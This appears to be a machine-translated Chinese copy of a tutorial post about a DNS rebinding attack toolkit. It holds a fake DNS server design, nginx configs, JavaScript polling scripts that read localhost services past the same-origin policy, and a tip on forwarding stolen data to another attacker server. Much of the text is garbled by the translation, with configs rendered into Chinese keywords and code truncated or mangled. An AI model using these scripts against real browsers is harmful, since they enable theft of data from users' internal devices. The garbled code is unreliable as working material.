# DNS 重新绑定工具:带有自定义脚本的 DNS 重新绑定工具

> 原文：<https://kalilinuxtutorials.com/dns-rebinding-tool/>

[![DNS Rebinding Tool : DNS Rebind Tool With Custom Scripts](img/1de6b9be22f8cffb31adadaba7b3e529.png "DNS Rebinding Tool : DNS Rebind Tool With Custom Scripts")](https://1.bp.blogspot.com/-7KCtm48Ral8/YRPw7yGq58I/AAAAAAAAOXc/c6VvXwAu-EcadCYDpbl0kYWz87x4LwgHgCLcBGAsYHQ/s16000/xdr.PNG)

这个项目是一个多合一的工具包，用来测试进一步的 **DNS 重新绑定**攻击，以及我对这类攻击的理解。它由一个 web 服务器和一个只响应查询的伪 DNS 服务器组成。

web 服务器的根索引允许使用简单的 web gui 配置和运行攻击。参见 [dnsrebindtool.43z.one](http://dnsrebindtool.43z.one/) 。

托管 web 服务器的基本 nginx 配置

服务器{
监听 80；
server _ name dnsrebindtool . 43z . one；
location/{
proxy _ pass http://localhost:5000；
}
}

**也读作-[subsh:在线子域检测脚本](https://kalilinuxtutorials.com/sub-sh-online-subdomain-detect-script/)**

web 服务器的/attack route 读取应该提供 basic64 编码的 javascript 的 GET 参数`script`,并用嵌入在常规 HTML 页面中的解码代码(包装在 setTimeout 周围)进行响应。

%科尔·"http://dnsrebindtool.43z.one/attack？script = YWxlcnQoMSk = "
<html>
<script>

setTimeout(function(){
alert(1)
}，3000)
</script>
</html

在我的域名 43z.one 的注册器中，我为子域`rebind`设置了一个 NS 记录，指向托管这个工具的 IP。

**NS A 81.4.124.10
重新绑定 NS ns.43z.one**

DNS 服务器只响应这种格式的查询

evcmxfm4g。81-4-124-10 .127-0-0-1。重新绑定。43z .一

第一部分(子域)只是一些随机 id，应该为每个攻击会话生成(web gui 在每次重新加载时都这样做)。第二个是 DNS 服务器在接下来的 2 秒内应该响应的 IP，第三个是在这段时间过后服务器应该响应的 IP。

$ date & & nslookup-type = a evcmxfm 4b . 81-4-124-10.127-0-0-1 . rebind . 43z . one
Fri 2018 年 2 月 2 日 21:18:20 CET
服务器:8.8.8.8
地址:8.8.8.8#53

非权威答案:
名称:evcmxfm 4b . 81-4-124-10.127-0-0-1

最后一个缺失的 peace 是用于重新绑定域的 nginx 配置。应该只将/attack 路径传递给工具，其他路径应该以错误响应。这允许使用除/attack 之外的所有路由攻击端口 80 上的其他服务。(例如/api/monitoring/stats 我的路由器暴露的端点)

服务器{
监听 80；
server _ name * . rebind . 43z . one；
外景/ {
回程 404；
}
位置/攻击{
proxy _ pass http://localhost:5000/attack；
}
}

**DNS 缓存驱逐**

var xhr = new XMLHttpRequest()
xhr . open(' GET '，' czg9g2olz.81-4-124-10.127-0-0-1 . rebind . 43z . one '，false)
xhr.send()
//浏览器第一次看到这个域就查询 dns 服务器
//并得到 81.4.124.10

//睡眠超过 2 秒

xhr.open('GET '，' czg 9g 2 olz . 81

这是这种攻击的问题。为了工作，浏览器必须重新发出新的 dns 查询以获得第二个 IP。理论上，如果您在两次请求之间等待足够长的时间，应该会发生新的查询。我的测试表明，虽然有一个更快，但更积极的方法。这很可能是特定于设置的。需要更多的测试我使用下面的脚本来测量等待变量的最佳值。在运行于 Debian buster/sid 上的 Chromium 62.0.3202.89 上测试。

var WAIT = 200
var start = date . now()

var interval = setInterval(function(){
var xhr = new XMLHttpRequest()
xhr . open(' GET '，'//' + $REBIND_DOMAIN，false)

xhr.send()

if(xhr . status = = 200){
document . body . innerhtml =(date . now()–start)/1000
document . body . innerhtml+= xhr . responsetext
clear interval(interval)
return
}
}，等待)

| 等待值(毫秒) | chrome 发送的请求 | 再次查询 dns 的时间 |
| --- | --- | --- |
| Zero | Seven hundred | Sixty |
| Ten | Seven hundred | Sixty |
| One hundred | Six hundred | Sixty-three |
| One hundred and twenty | Five hundred | Sixty-three |
| One hundred and fifty | four hundred | Sixty-three |
| one hundred and eighty  | four hundred | Seventy-five |
| Two hundred | Three hundred | Sixty-three |
| Two hundred and twenty | Three hundred | sixty-nine |
| Two hundred and fifty | Three hundred | seventy-eight |
| Two hundred and eighty | Three hundred | Eighty-seven |
| Three hundred | Two hundred | Sixty-three |
| Three hundred and twenty | Two hundred | Sixty-seven |
| Three hundred and forty | Two hundred | Seventy-one |
| Three hundred and sixty | Two hundred | Seventy-five |
| Three hundred and eighty | Two hundred | Seventy-nine |
| four hundred | Two hundred | Eighty-three |
| One thousand | One hundred | One hundred and three |

我开始了一个新的回购只是为了探索这个 [dns 缓存驱逐测试](https://github.com/h43z/dns-cache-eviction)

把所有这些放在一起并测试它。

```
echo -e "HTTP/1.1 200 OK\n\n TOPSECRET" | sudo nc -lvp 80 -q1 127.0.0.1
```

这个 netcat 实例提供了一些我想访问的内容。我保留默认的重新绑定域
**$ RANDOM $ . 81-4-124-10.127-0-0-1 . rebind . 43z . one**和默认脚本

var start = date . now()

var interval = setInterval(function(){
var xhr = new XMLHttpRequest()
xhr . open(' GET '，'//' + $REBIND_DOMAIN，false)
xhr . send()

if(xhr . status = = 200){
document . body . innerhtml =(date . now()–start)/1000
document . body . innerhtml+= xhr . respon

在 [dnsrebindtool.43z.one](http://dnsrebindtool.43z.one/) 上点击攻击按钮。打开“开发工具网络”选项卡，查看后台发生的情况。对于我来说，大约 60 秒后用字符串`TOPSECRET`填充，需要的时间。DNS 重新绑定绕过了 [SOP](https://en.wikipedia.org/wiki/Same-origin_policy) 。要从 iframe 中获取被破坏的数据，可以使用[窗口。PostMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) 或者在脚本本身中包含将数据转发到另一个攻击者服务器的代码。

[**Download**](https://github.com/h43z/dns-rebinding-tool/)